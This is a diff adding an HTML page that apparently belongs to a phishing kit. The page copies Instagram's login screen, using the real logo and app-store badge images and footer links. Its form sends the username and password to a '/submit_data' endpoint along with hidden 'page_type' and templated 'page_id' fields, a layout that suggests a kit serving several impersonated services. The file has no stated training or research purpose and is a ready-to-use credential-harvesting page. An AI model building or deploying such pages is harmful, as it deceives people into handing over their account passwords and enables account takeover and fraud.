@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ig-primary: #0095f6;
+            --ig-primary-hover: #1877f2;
+            --ig-border: #dbdbdb;
+            --ig-link: #00376b;
+            --ig-text: #262626;
+            --ig-secondary: #8e8e8e;
+            --ig-error: #ed4956;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            color: var(--ig-text);
+            font-size: 14px;
+            line-height: 18px;
+        }
+        
+        .main-container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .login-box {
+            background: #fff;
+            border: 1px solid var(--ig-border);
+            border-radius: 1px;
+            padding: 10px 0;
+            margin-bottom: 10px;
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin: 36px 0 12px;
+        }
+        
+        .logo img {
+            height: 51px;
+        }
+        
+        .login-form {
+            margin: 24px 40px;
+        }
+        
+        .form-group {
+            margin-bottom: 6px;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 9px 8px 7px;
+            background: #fafafa;
+            border: 1px solid var(--ig-border);
+            border-radius: 3px;
+            font-size: 12px;
+            line-height: 18px;
+            color: var(--ig-text);
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        
+        .form-control::placeholder {
+            color: var(--ig-secondary);
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 7px 16px;
+            background-color: var(--ig-primary);
+            border: 1px solid transparent;
+            border-radius: 4px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            line-height: 18px;
+            cursor: pointer;
+            margin: 8px 0;
+        }
+        
+        .login-button:hover {
+            background-color: var(--ig-primary-hover);
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 40px 18px;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: var(--ig-border);
+        }
+        
+        .divider-text {
+            color: var(--ig-secondary);
+            font-size: 13px;
+            font-weight: 600;
+            line-height: 15px;
+            margin: 0 18px;
+            text-transform: uppercase;
+        }
+        
+        .facebook-login {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #385185;
+            font-weight: 600;
+            margin: 8px 40px;
+            text-decoration: none;
+        }
+        
+        .facebook-login img {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+        }
+        
+        .forgot-password {
+            color: var(--ig-link);
+            font-size: 12px;
+            line-height: 14px;
+            text-align: center;
+            display: block;
+            margin: 12px 0;
+            text-decoration: none;
+        }
+        
+        .signup-box {
+            background: #fff;
+            border: 1px solid var(--ig-border);
+            border-radius: 1px;
+            padding: 10px 0;
+            max-width: 350px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .signup-text {
+            color: var(--ig-text);
+            font-size: 14px;
+        }
+        
+        .signup-link {
+            color: var(--ig-primary);
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .get-app {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .get-app p {
+            margin-bottom: 20px;
+        }
+        
+        .app-stores {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .app-stores img {
+            height: 40px;
+        }
+        
+        .footer {
+            padding: 24px 0;
+            text-align: center;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 12px;
+        }
+        
+        .footer-link {
+            color: var(--ig-secondary);
+            font-size: 12px;
+            text-decoration: none;
+        }
+        
+        .copyright {
+            color: var(--ig-secondary);
+            font-size: 12px;
+            margin-top: 12px;
+        }
+        
+        @media (max-width: 450px) {
+            .login-box,
+            .signup-box {
+                background: transparent;
+                border: none;
+            }
+            
+            .main-container {
+                justify-content: flex-start;
+                padding-top: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
+            </div>
+            
+            <form class="login-form" method="POST" action="/submit_data">
+                <input type="hidden" name="page_type" value="instagram">
+                <input type="hidden" name="page_id" value="{{ page_id }}">
+                
+                <div class="form-group">
+                    <input type="text" class="form-control" name="username" placeholder="Phone number, username, or email" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" class="form-control" name="password" placeholder="Password" required>
+                </div>
+                
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            
+            <div class="divider">
+                <span class="divider-text">or</span>
+            </div>
+            
+            <a href="#" class="facebook-login">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpWTmS.png" alt="Facebook icon">
+                Log in with Facebook
+            </a>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        
+        <div class="signup-box">
+            <p class="signup-text">
+                Don't have an account? <a href="#" class="signup-link">Sign up</a>
+            </p>
+        </div>
+        
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-stores">
+                <a href="#"><img src="https://static.cdninstagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store"></a>
+                <a href="#"><img src="https://static.cdninstagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play"></a>
+            </div>
+        </div>
+        
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Meta</a>
+                <a href="#" class="footer-link">About</a>
+                <a href="#" class="footer-link">Blog</a>
+                <a href="#" class="footer-link">Jobs</a>
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">API</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Top Accounts</a>
+                <a href="#" class="footer-link">Locations</a>
+                <a href="#" class="footer-link">Instagram Lite</a>
+                <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
+                <a href="#" class="footer-link">Meta Verified</a>
+            </div>
+            <div class="copyright">
+                © 2024 Instagram from Meta
+            </div>
+        </footer>
+    </div>
+</body>
+</html> 
